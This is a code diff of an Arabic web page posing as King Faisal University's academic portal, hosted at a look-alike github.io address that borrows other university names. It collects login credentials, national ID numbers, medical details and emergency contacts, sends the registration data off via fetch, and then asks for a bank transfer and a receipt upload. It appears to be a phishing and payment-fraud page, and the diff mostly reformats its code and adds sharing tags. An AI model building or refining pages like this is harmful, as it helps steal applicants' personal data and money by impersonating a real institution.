@@ -4,11 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
+
+<!-- OG Tags للعرض الرسمي -->
 <meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
-<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
+<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب. يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.">
 <meta property="og:image" content="https://i.postimg.cc/VLtqHrYr/images-6.jpg">
 <meta property="og:type" content="website">
+<meta property="og:url" content="https://pnu-admissions.github.io/ksu.edu.saa/">
 <meta name="twitter:card" content="summary_large_image">
+
 <link rel="icon" type="image/png" href="kfu_logo.png">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -24,7 +28,6 @@
 body{background:var(--bg);color:#222;}
 a{text-decoration:none;color:inherit;}
 button{cursor:pointer;}
-
 .login-container{
 max-width:500px;margin:50px auto;background:linear-gradient(135deg,var(--uf-green),var(--gold));border-radius:14px;padding:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.15);}
 .login-header img{width:80px;margin-bottom:12px;}
@@ -104,24 +107,12 @@ textarea{resize:vertical;}
 </header>
 
 <div class="grid2">
+<!-- نسخ كامل الحقول كما في كودك السابق -->
 <div>
 <label>الاسم الكامل *</label><input type="text" name="fullName" required>
 <label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
-<label>الجنسية *</label><select name="nationality" required>
-<option value="">اختر الجنسية</option>
-<option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option>
-<option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option>
-<option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option>
-<option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option>
-<option>إندونيسيا</option><option>Other</option>
-</select>
-<label>الدولة (مكان الإقامة) *</label>
-<select name="country" required>
-<option value="">اختر الدولة</option>
-<option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option>
-<option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option>
-<option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option>
-</select>
+<label>الجنسية *</label><select name="nationality" required><option value="">اختر الجنسية</option><option>السعودية</option><option>اليمن</option><option>مصر</option><option>سوريا</option><option>الأردن</option><option>العراق</option><option>لبنان</option><option>فلسطين</option><option>السودان</option><option>تونس</option><option>المغرب</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>تركيا</option><option>أفغانستان</option><option>باكستان</option><option>الهند</option><option>إندونيسيا</option><option>Other</option></select>
+<label>الدولة (مكان الإقامة) *</label><select name="country" required><option value="">اختر الدولة</option><option>المملكة العربية السعودية</option><option>اليمن</option><option>مصر</option><option>الإمارات</option><option>الكويت</option><option>البحرين</option><option>عمان</option><option>قطر</option><option>الأردن</option><option>سوريا</option><option>لبنان</option><option>السودان</option><option>المغرب</option><option>تونس</option><option>أخرى</option></select>
 <label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
 <label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
 <label>مكان الميلاد (المدينة)</label><input type="text" name="birthPlace">
@@ -140,8 +131,7 @@ textarea{resize:vertical;}
 <label>نوع الدراسة *</label><select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
 <label>الكلية / القسم *</label><select name="faculty" required>
 <option value="">اختر الكلية</option>
-<option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option><option>كلية الحاسبات وتقنية المعلومات</option>
-<option>كلية التربية</option><option>كلية القانون</option><option>كلية الصحة العامة</option>
+<option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option><option>كلية الحاسبات وتقنية المعلومات</option><option>كلية التربية</option><option>كلية القانون</option><option>كلية الصحة العامة</option>
 </select>
 <label>هل لديك أي حالة طبية هامة؟</label><input type="text" name="medicalInfo" placeholder="إن وُجد">
 <div class="section-title">جهة الاتصال في حالات الطوارئ</div>
@@ -175,7 +165,7 @@ textarea{resize:vertical;}
 </form>
 </div>
 
-<!-- صفحة السداد بعد إرسال البيانات -->
+<!-- صفحة السداد -->
 <div class="payment-section" id="paymentSection">
 <h2>صفحة السداد</h2>
 <label>اسم المحول:</label><input type="text" id="payerName" required>
@@ -201,60 +191,16 @@ textarea{resize:vertical;}
 
 <script>
 let hasSubmitted=false;
-
-function showForm(){
-document.getElementById('registrationForm').style.display='block';
-}
-
+function showForm(){document.getElementById('registrationForm').style.display='block';}
 function copyAccount(){
 let copyText=document.getElementById('payerAccount');
-copyText.select();
-copyText.setSelectionRange(0,99999);
-document.execCommand('copy');
-showToast('✅ تم نسخ رقم الحساب');
-}
-
-function showToast(msg){
-const toast=document.getElementById('toast');
-toast.textContent=msg;
-toast.classList.add('show');
-setTimeout(()=>toast.classList.remove('show'),2500);
-}
-
-document.getElementById('loginForm').addEventListener('submit',function(e){
-e.preventDefault();
-const user=document.getElementById('username').value.trim();
-const pass=document.getElementById('password').value.trim();
-if(!user || !pass){showToast('❌ يرجى ملء اسم المستخدم وكلمة المرور');return;}
-showToast('✅ تم تسجيل الدخول');
-});
-
-document.getElementById('registrationFormForm').addEventListener('submit',function(e){
-e.preventDefault();
-if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}
-const formData=new FormData(this);
-fetch(this.action,{method:'POST',body:formData})
-.then(res=>{if(res.ok){
-showToast('✅ تم إرسال بياناتك بنجاح');
-document.getElementById('registrationForm').style.display='none';
-document.getElementById('paymentSection').style.display='block';
-hasSubmitted=true;
-}else showToast('❌ حدث خطأ حاول لاحقاً');
-}).catch(()=>showToast('❌ فشل الاتصال'));
-});
-
-document.getElementById('submitPayment').addEventListener('click',function(){
-const payerName=document.getElementById('payerName').value.trim();
-const payerAccount=document.getElementById('payerAccount').value.trim();
-const paymentDate=document.getElementById('paymentDate').value;
-const amount=document.getElementById('amount').value.trim();
-const receiptFile=document.getElementById('receiptFile').files[0];
-if(!payerName||!payerAccount||!paymentDate||!amount||!receiptFile){showToast('❌ يرجى ملء جميع الحقول وإرفاق الإيصال');return;}
-showToast('✅ تم إرسال السداد بنجاح');
-document.getElementById('paymentSection').style.display='none';
-document.getElementById('successMessage').style.display='block';
-});
+copyText.select();copyText.setSelectionRange(0,99999);
+document.execCommand('copy');showToast('✅ تم نسخ رقم الحساب');}
+function showToast(msg){const toast=document.getElementById('toast');toast.textContent=msg;toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),2500);}
+document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const user=document.getElementById('username').value.trim();const pass=document.getElementById('password').value.trim();if(!user || !pass){showToast('❌ يرجى ملء اسم المستخدم وكلمة المرور');return;}showToast('✅ تم تسجيل الدخول');});
+document.getElementById('registrationFormForm').addEventListener('submit',function(e){e.preventDefault();if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}const formData=new FormData(this);fetch(this.action,{method:'POST',body:formData}).then(res=>{if(res.ok){showToast('✅ تم إرسال بياناتك بنجاح');document.getElementById('registrationForm').style.display='none';document.getElementById('paymentSection').style.display='block';hasSubmitted=true;}else showToast('❌ حدث خطأ حاول لاحقاً');}).catch(()=>showToast('❌ فشل الاتصال'));});
+document.getElementById('submitPayment').addEventListener('click',function(){const payerName=document.getElementById('payerName').value.trim();const payerAccount=document.getElementById('payerAccount').value.trim();const paymentDate=document.getElementById('paymentDate').value;const amount=document.getElementById('amount').value.trim();const receiptFile=document.getElementById('receiptFile').files[0];if(!payerName||!payerAccount||!paymentDate||!amount||!receiptFile){showToast('❌ يرجى ملء جميع الحقول وإرفاق الإيصال');return;}showToast('✅ تم إرسال السداد بنجاح');document.getElementById('paymentSection').style.display='none';document.getElementById('successMessage').style.display='block';});
 </script>
 
 </body>
-  </html>
+</html>
